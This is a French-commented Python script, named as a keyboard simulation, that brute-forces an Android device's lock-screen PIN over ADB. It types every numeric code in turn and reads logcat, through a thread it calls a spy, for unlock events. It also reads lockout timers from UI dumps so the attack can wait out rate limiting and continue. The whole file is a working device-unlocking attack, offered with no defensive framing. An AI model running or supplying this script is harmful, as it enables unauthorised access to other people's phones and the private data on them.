# Nom du fichier : simulation_clavier.py (VERSION COMPLETE FUSIONNEE)
import time
from ppadb.client import Client as AdbClient
import sys
import os
import re
import threading
import subprocess

# On utilise un "Event", la maniere la plus propre de communiquer entre threads
SUCCESS_EVENT = threading.Event()
SPY_REPORT_FILE = "rapport_espion.txt"

# --- L'ESPION REECRIT POUR ECRIRE DANS UN FICHIER ---
def logcat_writer(device_serial):
    try:
        adb_path = os.path.join(os.getcwd(), "platform-tools", "adb.exe")
        
        clear_command = [adb_path, "-s", device_serial, "logcat", "-c"]
        subprocess.run(clear_command, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        
        listen_command = [adb_path, "-s", device_serial, "logcat", "*:V"]
        
        with open(SPY_REPORT_FILE, "w", encoding="utf-8", errors="ignore") as report_file:
            process = subprocess.Popen(listen_command, stdout=report_file, stderr=subprocess.STDOUT, 
                                       creationflags=subprocess.CREATE_NO_WINDOW)

            SUCCESS_EVENT.wait() # L'espion attend le signal d'arret
            
            process.terminate()
            process.wait()

    except Exception:
        SUCCESS_EVENT.set()

# --- FONCTION DE DETECTION DYNAMIQUE DE BLOCAGE REINTEGREE ---
def get_lockout_duration(device):
    """
    Analyse l'ecran pour trouver une duree de blocage et la retourne en secondes.
    Retourne 0 si aucun blocage n'est detecte.
    """
    try:
        device.shell("uiautomator dump /sdcard/ui.xml")
        device.pull("/sdcard/ui.xml", "ui_dump.xml")

        with open("ui_dump.xml", "r", encoding="utf-8", errors="ignore") as f:
            content = f.read().lower()

        if os.path.exists("ui_dump.xml"):
            os.remove("ui_dump.xml")

        # Patterns Regex pour trouver un nombre suivi d'une unite de temps
        # (\d+) capture un ou plusieurs chiffres
        patterns = {
            # Unite, Multiplicateur
            "minutes": (r"(\d+)\s+minutes?", 60),
            "seconds": (r"(\d+)\s+secondes?", 1)
        }

        for unit, (pattern, multiplier) in patterns.items():
            match = re.search(pattern, content)
            if match:
                # On a trouve un motif ! On extrait le nombre.
                number_str = match.group(1)
                duration = int(number_str) * multiplier
                return duration # On retourne la duree en secondes

        return 0 # Aucun motif de blocage trouve
    except Exception:
        return 0

def main():
    listener_thread = None # On declare la variable ici
    try:
        code_length = int(sys.argv[1]); detect_lockout_enabled = sys.argv[2].upper() == "O"; start_number = int(sys.argv[3])
    except:
        print("ERREUR: Parametres manquants."); code_length = 4; detect_lockout_enabled = True; start_number = 0; time.sleep(5)

    found_code = None
    try:
        if os.path.exists(SPY_REPORT_FILE):
            os.remove(SPY_REPORT_FILE)

        client = AdbClient(host="127.0.0.1", port=5037)
        devices = client.devices()
        if len(devices) == 0: print("ERREUR : Aucun appareil detecte."); time.sleep(10); sys.exit(1)
        device = devices[0]
        device_serial = device.serial
        
        print(f"\nConnecte a : {device_serial}")
        print("--- CONFIGURATION APPLIQUEE ---")
        print(f"-> Longueur du code : {code_length} chiffres\n-> Nombre de depart : {start_number}\n-> Detection de blocage : {'Activee' if detect_lockout_enabled else 'Desactivee'}")
        print("---------------------------------")
        
        listener_thread = threading.Thread(target=logcat_writer, args=(device_serial,), daemon=True)
        listener_thread.start()
        
        print("Lancement de la chasse au code...")
        time.sleep(3)

        max_number = 10**code_length
        for number in range(start_number, max_number):
            if not listener_thread.is_alive():
                print("ERREUR: L'espion s'est arrete prematurement.")
                break

            if detect_lockout_enabled:
                lockout_duration = get_lockout_duration(device)
                if lockout_duration > 0:
                    wait_time = lockout_duration + 5
                    print(f"\nBLOCAGE DYNAMIQUE DETECTE ! Pause de {wait_time} secondes...")
                    time.sleep(wait_time)
                    print("Reprise des tentatives.")
            
            code = str(number).zfill(code_length)
            print(f"Envoi du code : {code}")
            
            try: device.shell(f'input text "{code}"; input keyevent 66')
            except Exception as e: print(f"  -> Avertissement : {e}")
            
            time.sleep(2.5)

            try:
                with open(SPY_REPORT_FILE, "r", encoding="utf-8", errors="ignore") as f:
                    report_content = f.read()
                if "keyguardGoingAway" in report_content or "addAuthToken succeeded" in report_content:
                    print("\n  -> [LECTURE] SIGNAL DE SUCCES TROUVE DANS LE RAPPORT !")
                    found_code = code 
                    break 
            except Exception:
                pass

        SUCCESS_EVENT.set()
        
        if listener_thread:
            listener_thread.join(timeout=2)

        if found_code:
            print("\n######################################################")
            print("################    DEVERROUILLAGE REUSSI    ################")
            print(f"    LE CODE PIN EST : {found_code}    ")
            print("######################################################\n")
        else:
            print("--- Simulation terminee (tous les codes ont ete essayes sans succes) ---")

    except Exception as e:
        SUCCESS_EVENT.set()
        if listener_thread:
            listener_thread.join(timeout=2)
        print(f"UNE ERREUR CRITIQUE EST SURVENUE : {e}")

    finally:
        if os.path.exists(SPY_REPORT_FILE):
            try:
                os.remove(SPY_REPORT_FILE)
            except Exception as e:
                print(f"Avertissement : Impossible de supprimer le fichier rapport. {e}")

if __name__ == "__main__":
    main()